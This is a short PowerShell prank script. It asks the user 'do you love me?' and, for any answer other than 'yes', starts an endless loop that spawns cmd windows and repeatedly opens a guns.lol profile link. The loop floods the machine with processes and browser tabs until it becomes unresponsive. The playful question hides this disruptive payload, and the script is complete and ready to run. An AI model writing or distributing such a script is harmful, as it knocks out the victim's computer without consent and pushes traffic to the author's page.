Clear-Host
$answer = Read-Host "do you love me?"

if ($answer.ToLower() -eq "yes") {
    Write-Host "Me too" -ForegroundColor Green
} else {
    Write-Host "I don't love you either 😭" -ForegroundColor Red
    while ($true) {
        Start-Process cmd -ArgumentList "/k color 5 & echo ANGELO YHBK !"
        Start-Process "https://guns.lol/angelo_x"
    }
}